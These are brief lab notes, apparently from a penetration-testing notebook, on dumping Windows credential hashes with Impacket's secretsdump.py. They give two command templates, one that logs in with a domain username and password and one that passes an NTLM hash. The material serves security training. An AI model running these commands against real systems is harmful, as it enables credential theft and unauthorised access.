# Dumping Hashes with secretsdump.py

What is credential dumping?



start Windows Server and windows 10 enterprise.&#x20;

Run "secretsdump.py" in terminal to check if it exists.&#x20;

"secretsdump.py DOMAIN\_NAME/USERNAME:'PASSWORD'@WIN\_10\_IP"

"secretsdump.py USERNAME@WIN\_10\_IP -hashes HASH"&#x20;

the hash that was got form ntlm class.&#x20;
